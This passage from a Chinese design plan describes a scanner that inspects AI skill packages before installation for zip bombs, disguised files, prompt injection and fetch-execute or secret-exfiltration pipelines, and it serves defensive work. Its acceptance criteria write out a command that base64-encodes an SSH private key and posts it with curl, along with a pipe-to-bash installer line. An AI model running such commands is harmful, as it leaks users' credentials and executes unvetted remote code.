
- `archive_extractor.rs`
- `ARCHIVE_ZIP_BOMB`
- `ARCHIVE_PATH_TRAVERSAL`
- `ARCHIVE_NESTED_TOO_DEEP`
- `ARCHIVE_EXTRACTION_FAILED`
- `file_magic.rs`
- `FILE_MAGIC_MISMATCH`
- `pipeline.rs`
- source/sink/transform 识别
- fetch-execute、archive-execute、sensitive-exfiltration、find-exec 检测
- known installer 降级
- pipeline finding 去重

验收：

- `cat ~/.ssh/id_rsa | base64 | curl -X POST ...` 触发高风险。
- `curl https://bun.sh/install | bash` 在文档/已知安装器策略下可降级。
- 实际执行语境仍可 hard block。
- 压缩包内脚本会被加入后续扫描。
- zip bomb/path traversal archive entry 会产生明确 finding。
- archive 临时解压目录扫描后清理。
- 含 `vbaProject` 的 `.docx` 产生 `OFFICE_VBA_MACRO`（CRITICAL），含 `oleObject`/`embeddings` 的产生 `OFFICE_EMBEDDED_OLE`（HIGH）。
- text/code 扩展名伪装成 PE/ELF/Mach-O/ZIP/PDF/Office 会产生 `FILE_MAGIC_MISMATCH`，并按风险分级。
- 文件总数超过 policy 限制产生 `EXCESSIVE_FILE_COUNT`，单文件过大产生 `OVERSIZED_FILE`，`partial_scan` 原因可解释。

### P3：Analyzability 与报告归一化

目标：让扫描覆盖率和不可分析内容可解释。

交付：

- `analyzability.rs`
- `LOW_ANALYZABILITY`
- `UNANALYZABLE_BINARY`
- Finding 归一化与 same-path 共现 metadata
- policy fingerprint
- ThreatCategory 到 IssueCategory 的 adapter 映射

验收：

- 超大截断、不可读、未知二进制均产生明确 finding。
- 静态图片等 inert assets 不造成误报。
- 多 analyzer 扩展后重复告警显著减少。
- 新增分类不会破坏旧前端和数据库反序列化，同时保留原始 threat category metadata。

### P4：深度本地静态项

目标：按成本逐步移植 Cisco 深度能力。

候选交付：

- YARA 或类 YARA 规则加载。
- PDF 结构风险：`/JS`、`/JavaScript`、`/OpenAction`、`/Launch`。
- Office 风险：P2 仅通过遍历 ZIP entry 名称检测 `vbaProject` / `oleObject` / `embeddings`（成本极低，产生 `OFFICE_VBA_MACRO` / `OFFICE_EMBEDDED_OLE`）。P4 进一步解压 VBA macro 内容进行静态分析、检查 OLE embedded 对象的实际类型和载荷，成本更高且可能依赖外部库。
- `.pyc` 与 `.py` 一致性检查。
- Homoglyph/unicode 隐写增强。
- indirect prompt injection / unicode steganography parity。
- 跨 Skill 描述重叠检测。

验收：

- 可选项默认本地离线运行。
- 任何依赖导致不可用时回退到已实现 Rust 静态扫描，不阻塞基础扫描。

---

## 6. 阻断与评分策略

保留现有 `score` 和 `blocked`。

阻断规则：

- `hard_trigger = true` 直接阻断。
- policy 可将特定 `rule_id` 覆盖为 hard trigger。
- symlink 继续硬阻断。
- 明确系统指令覆盖、隐藏行为、远程下载执行、凭据外传、破坏性命令默认阻断。

评分策略：

- P0 到 P2 阶段不替换现有 `calculate_score_weighted`；继续使用规则 `weight`、`hard_trigger` 和 `confidence` 乘数，确保升级扫描能力时不会同时改变产品评分语义。
- P0 到 P2 新增的 finding（如 `FILE_MAGIC_MISMATCH`、`ARCHIVE_ZIP_BOMB` 等）按规则 `weight` 参与现有评分公式，不引入新评分维度。
- 下面的严重度区间只作为新增规则默认 `weight` 的配置参考，不作为立即替换的评分公式。
- P3 统一评估评分模型：届时决定 `LOW_ANALYZABILITY`、`EXCESSIVE_FILE_COUNT`、`OVERSIZED_FILE` 等非恶意 finding 对 `security_score` 的影响方式——可能引入独立维度（如"可分析性分数"单独展示），或按 severity 映射为低权重扣分纳入现有公式，或仅作为 metadata 不影响分数。P3 之前这些 finding 仅产生记录，不改变 `calculate_score_weighted` 输出。

严重度与 weight 配置参考（新增规则的默认 weight 区间）：

| severity | 默认 weight 区间 | 说明 |
|---|---|---|
| `Critical` | 80-100 | |
| `High` | 40-70 | |
| `Medium` | 15-40 | |
| `Low` | 3-15 | |
| `Info` | 0-3 | 默认不扣或极低扣分 |

**注意**：这些是规则 YAML 中的 `weight` 原始值。实际扣分受两个因素影响：① 非 hard trigger 规则会乘以 `confidence` 乘数（High=1.0, Medium=0.65, Low=0.35）得到有效权重；② 同一规则多文件命中时按几何衰减公式（`DECAY=0.5`）递减：首次命中扣 `weight × 0.5`，第二次追加 `weight × 0.25`，以此类推。因此 `Critical weight=100` 的规则首次命中实际扣 50 分。配置 weight 时应考虑衰减后的实际影响。

---

## 7. 测试计划

测试分层：

- 规则加载测试：YAML 解析、重复 ID、非法正则、禁用规则。
- 兼容回归测试：现有 `scanner.rs` 测试全部保留。
- Prompt Injection fixture：override、bypass、conceal、system prompt reveal。
- Structure fixture：frontmatter 缺失、隐藏脚本、路径穿越引用、未引用脚本。
- Reference fixture：Markdown 链接、自然语言引用、执行引用、`@reference:`、`include/import/load:`、Python import、本地/第三方区分。
- Allowed-tools fixture：Read/Write/Bash/Grep/Glob/Network 分项、localhost-only network 降级/排除。
- Trigger fixture：过泛描述、过短描述、关键词诱导、description/behavior mismatch。
- File magic fixture：源码扩展名伪装可执行、图片扩展名伪装脚本、text/code label mismatch。
- Archive fixture：zip bomb、嵌套过深、路径穿越、压缩包内恶意脚本、含 `vbaProject` 的 `.docx`、含 `oleObject` 的 `.xlsx`。
- File inventory fixture：文件数超限产生 `EXCESSIVE_FILE_COUNT`、单文件过大产生 `OVERSIZED_FILE`、metadata 包含 `type_breakdown`。
- Pipeline fixture：fetch-execute、archive-execute、secret exfil、known installer 降级。
- Analyzability fixture：UTF-16、二进制、静态图片、超大文件、不可读文件。
- Flow fixture：`scan_file(SKILL.md)`（`ScanMode::SingleFile`，不产生结构类误报）、`prepare_skill_installation` 目录扫描（`ScanMode::Directory`，全部 analyzer 运行）、`skip_readme`、进度回调、partial scan 阻断。
- Severity mapping fixture：现有 4 级到 5 级映射正确性，YAML 规则 severity 值与 `IssueSeverity` 枚举一致。
- DB 兼容性 fixture：验证含旧 `IssueSeverity` 值（`Error`/`Warning`）的 JSON 能通过 serde alias 正确反序列化为新值（`High`/`Medium`）；验证新值序列化后可正确反序列化；验证含旧值的已存储 `SecurityReport` 可正常读取和展示。
- 性能测试：接近 2000 文件上限的目录扫描耗时。

建议增加一组跨引擎对齐 fixture：

- 从 `reference/skill_scanner` 抽取静态规则样例。
- 同一 fixture 运行本项目扫描器，记录期望 rule_id。
- 只对本地静态检测对齐，不纳入 LLM/VT/API 结果。

---

## 8. 风险与取舍

| 风险 | 应对 |
|------|------|
| 规则外置后启动编译 Regex 成本增加 | lazy cache，按扩展名构建 `RegexSet`，预编译失败在启动时报错 |
| Prompt Injection 误报 | `exclude_patterns`、文档目录降级、示例文本降级 |
| Archive extraction 引入资源消耗 | 深度、总大小、文件数、压缩比限制，解压目录扫描后清理 |
| File magic 误报 | 先使用高置信 magic byte；shebang 兼容扩展名可降级；未知类型不强行判错 |
| Pipeline 分析复杂 | 先覆盖高价值链路，不追求完整 shell parser |
| YARA Rust 依赖不稳定 | P4 可选，不作为 P0-P3 阻塞项 |
| 报告字段扩展影响前端 | adapter 保持旧字段，新增 metadata 渐进展示 |
| Severity 4→5 级影响已存储数据 | serde alias 兼容旧值（`Error`→`High`、`Warning`→`Medium`），无需数据迁移脚本 |
| `file_types` 迁移遗漏导致误报 | P0 逐条从 `rule_applies_to_extension` 提取，迁移后用现有测试 fixture 回归验证 |
| Apache-2.0 参考代码/规则迁移 | 保留许可证声明，记录规则来源和同步版本 |

---

## 9. 暂不采用的方向

不把 Cisco Python 扫描器作为默认扫描核心引入，原因：

- 增加 Python/依赖打包和跨平台发布复杂度。
- Tauri 桌面端安装前扫描需要低延迟和稳定回退。
- 本项目已有与安装流程深度绑定的 `blocked`、`partial_scan` 和 UI 模型。

可以保留一个远期实验方向：把 Cisco scanner 作为“深度扫描 sidecar”仅在开发/调试或用户显式启用时运行。但这不是本计划主线，也不影响方案一落地。

---

## 10. 建议执行顺序

1. P0：规则外置化、policy、兼容现有 84 条规则。
2. P1a：SkillContext 构建、结构扫描、Secret 脱敏、`ScanMode` 分层、现有流程兼容。
3. P1b：Prompt Injection、allowed-tools 一致性检查、行为一致性检查、description 质量检查。
4. P2：Archive extraction、File magic、Pipeline/Compound 分析。
5. P3：Analyzability、Finding 归一化、报告 metadata、分类映射、评分模型统一评估。
6. P4：YARA/PDF/Office/bytecode 等深度静态能力。

最小可交付版本建议做到 P1a：它建立 Skill 语义解析基础和结构扫描能力，确保现有流程不退化，同时为 P1b 的 Prompt Injection 和一致性检查提供上下文支撑。

---

## 11. 文档维护

| 项 | 说明 |
|----|------|
| 创建日期 | 2026-06-02 |
| 计划版本 | v4，修正 file_types 迁移策略、明确 ScanMode 放置、统一内部/外部 severity 为 5 级、补充 DB 兼容与分类体系方案 |
| 参考来源 | 当前项目 `src-tauri/src/security`、`reference/skill_scanner` 本地快照 |
| 更新时机 | 扫描架构变更、规则包迁移完成、Cisco 参考快照更新 |
